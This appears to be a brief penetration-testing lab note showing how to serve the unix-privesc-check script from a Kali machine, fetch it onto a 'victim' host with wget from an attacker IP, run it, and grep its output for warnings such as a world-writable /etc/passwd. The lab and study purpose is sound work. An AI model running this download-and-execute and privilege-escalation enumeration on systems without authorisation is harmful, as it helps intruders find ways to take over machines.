Kali
```bash
cp /usr/bin/unix-privesc-check .

python3 -m http.server 80
```

Victim
```bash
wget http://192.168.45.176/unix-privesc-check

chmod 777 unix-privesc-check

# the script supports "standard" and "detailed" mode.
./unix-privesc-check standard > output.txt

cat output.txt  | grep WARNING
# Search the output below for the word 'WARNING'.  If you don't see it then WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
```
